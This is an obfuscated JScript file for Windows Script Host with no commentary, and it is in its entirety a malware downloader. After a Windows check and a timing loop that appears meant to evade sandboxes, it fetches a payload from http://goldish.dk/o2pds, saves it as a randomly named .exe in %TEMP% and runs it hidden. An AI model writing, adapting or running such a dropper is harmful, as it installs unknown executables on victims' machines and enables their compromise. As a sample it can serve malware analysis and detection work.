var _II = false;
var _ZX = "CreateObject";
var _Q = function _DK() {return WScript[_ZX]("WScript"+".Shell");}(), _FA = 11;
var _EX = "MSXML2.XMLHTTP";
var _P = 2123213;
var _F = 0;
function _B(_AI){_Q["Run"](_AI, _F, _F);};
function _T0(){return _EX + "";};
function _N(_Q0, _K0){_F = _F * 1; return _Q0 - _K0;};
function _CF(){return _ZX;};
/*@cc_on
  @if (@_win32 || @_win64)
    _II = true;
  @end
@*/
if (_II)
{
var _S = "";
function _GC(){return 22;};
var _YJ = 0; var _TE = 0;
function _XN()
{
var _QD = new this["Date"]();
var _J = _QD["getUTCMilliseconds"]();
WScript["Sleep"](_GC());
var _QD = new this["Date"]();
var _V = _QD["getUTCMilliseconds"]();
WScript["Sleep"](_GC());
var _QD = new this["Date"]();
var _KZ = _QD["getUTCMilliseconds"]();
var _YJ = "_D0";
_YJ = _N(_V, _J);
var _TE = "_OX";
_TE = _N(_KZ, _V);
_S = "open";
return _N(_YJ, _TE);
}
var _T1 = false;
var _JI = false;
for (var _MB = _F; _MB < _GC() * 1; _MB++){if (_XN() != _F){
_T1 = true; 
_TE = "31" + 11 * _YJ + _TE; 
_JI = true; 
break;
}}
function _TF() {return ((_T1 == true) && (_T1 == _JI)) ? 1 : _F;};
if (_T1 && _TF() && _JI){
function _T() {return _Q["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "gKv4gOX3GmGAlie.ex" + "e";};
 _AF = _T0();
 _I = WScript[_ZX](_AF);
 var _X = 1;
 while (_X){
try {
	if (_X == 1)
	{
		_I[_S]("GET", "http://goldish.dk/o2pds", false);
		_I["send"]();
		_K = "Sleep";
	}
	WScript[_K](_GC() + 120); 
	if (_I["readystate"] < 2 * 2) continue;
	_X = _F;
	function _D(_O) {var _N0 = (1, 2, 3, 4, 5, _O); return _N0;};
	_RV = WScript[_CF()]("ADODB.Stream");
	_AF = _RV;
	_AF[_S]();
	_AF["type"] = _D(1);
	_AF["write"](_I["ResponseBody"]);
	_RV["position"] = _D(_F);
	_AF["Save" + "ToFile"](_T(), 2);
	_RV["cl"+"ose"]();
	_VY = _T();
	_B(_VY);
} catch(_LZ){};
}
}
}

